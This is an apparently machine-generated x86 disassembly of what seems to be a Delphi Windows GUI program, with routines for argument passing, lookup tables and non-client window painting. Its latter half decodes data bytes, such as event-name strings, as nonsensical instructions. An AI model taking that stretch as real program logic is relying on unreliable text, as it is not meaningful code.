lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4303a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4303ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_430434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43049c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_40482c
push eax
mov eax esi
call sub_40481c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43025c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_430500
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_430584
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4305c0
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43065c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_430679 ]
jmp [ eax * 4 + jump_table_4306e2 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4309e8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_430b43
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_430584
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4303a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412640
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_430b70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430bab
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430bb2
retn
mov eax [ rw-data ]
call sub_403290
mov eax rw-data
call sub_403fe0
sub_4311b5
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x88656c62
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070023 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
js r-xdata
add al 0x93
jo r-xdata
enter 0x4393 0x0
mov eax 0xb8ff0001
push eax
outsd
jo r-xdata
inc edi
je r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
xchg ebx eax
inc ebx
add [ eax - 0x4700ffff ] bh
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
add [ eax ] eax
jo r-xdata
jo r-xdata
imul esi [ ebp + 0x49 ] 0x706f666e
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add [ eax - 0x80000000 ] al
inc esp
jb r-xdata
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
jb r-xdata
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
adc [ ecx ] eax
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0a00
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9421245
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : 0x65476e4f ] cl
je r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
inc esp
outsd
ja r-xdata
sub [ eax ] eax
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0600
inc ebp
js r-xdata
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
jb r-xdata
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ eax + 0x43 ]
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
call 0xffffffffd843573e
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
xchg ebx eax
inc ebx
add [ eax ] cl
or cl [ edi + 0x6e ]
sub [ ecx ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
outsd
xchg ebx eax
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al bl
inc ebx
insb
jae r-xdata
inc ebx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al bh
inc edi
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax ] al
add [ eax ] al
add ah al
adc eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ 0x15b00043 ] dl
inc ebx
add [ ecx + eax - 0x5d4c0000 ] cl
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ ebp + esi * 8 + 0x32280043 ] dl
inc eax
add [ edx + esi + 0x40 ] al
add [ esp + ebx * 2 ] cl
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d002e ] al
outsb
xchg ebp eax
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc ebx
add al bl
dec ecx
inc ebx
add ah bh
dec ecx
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
outsb
push ebx
je r-xdata
dec edi
je r-xdata
pop eax
xchg esp eax
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shr [ eax + 0x14 ] 0x43
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
inc esp
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
add [ eax ] ch
xor al [ eax ]
inc esp
dec esp
popad
jns r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esp + ebx * 2 ] cl
je r-xdata
inc ebx
add [ edi + eax * 2 ] cl
inc ebx
add [ esp + eax * 2 + 0x540c0043 ] al
inc ebx
jne r-xdata
add [ eax ] al
hlt
inc ebx
jne r-xdata
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc esp
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0x5c
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
les edx [ 0xc070043 ]
push esp
inc ebx
jne r-xdata
xor al [ eax ]
or al 0x5c
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edx + 0x43 ] ah
add [ 0x6f546c74 ] al
jo r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add [ eax ] al
hlt
inc eax
inc ecx
add al dh
inc esi
inc ebx
add al bl
dec eax
inc ebx
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x43d80041 ] bh
inc ebx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al bh
inc edi
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
je r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
add [ eax ] cl
jecxz r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] dh
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x43d80041 ] bh
outsd
insd
add [ eax ] dh
inc ebx
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
fadd [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add ah ah
xchg [ ebx ] eax
pop ebx
add [ eax ] al
jmp [ eax - 0x2a ]
inc eax
inc ecx
add al dh
inc esi
inc ebx
add al bl
dec eax
inc ebx
test [ ebx ] 0x30
jb r-xdata
jmp [ eax ]
jae r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x8eb46564
inc ebx
add [ ecx + 0x43 ] cl
pop [ ebx ]
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
mov es [ ebx ]
dec esp
loope r-xdata
je r-xdata
add bh bh
and [ eax + 0x43 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_41aa90
jo r-xdata
add bh bh
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4387cc73
add [ edx ] bh
add bh bh
push esp
push es
add [ ecx + 0x43 ] bh
add [ ecx + eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
fmul [ eax + 0x43 ]
outsd
je r-xdata
inc edx
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
outsd
insb
xor [ edi + 0x680041 ] ch
add bh bh
inc eax
loop r-xdata
mov [ 0x1680043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov es [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add bh bh
in al dx
loop r-xdata
add bh bh
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add bh bh
adc bl ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
call [ eax + ecx * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x43 ] ah
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
adc al 0x43
add [ esi + 0x1 ] ch
add bh bh
xchg esp eax
dec eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
adc al 0x48
inc ebx
add [ eax + 0x48 ] dl
inc ebx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
adc [ eax ] al
0xc0ff0000 0x43e2
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
add [ eax ] al
and [ eax ] 0x0
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x63010000 ] bl
loop r-xdata
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
loopne r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
push [ eax + ecx * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
xor al 0x48
or edx [ edx + esi * 2 + 0x61 ]
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ eax ] al
dec edi
jbe r-xdata
add al 0x93
push eax
outsd
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] eax
[ edx + eax ]
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
outsb
je r-xdata
inc esp
outsb
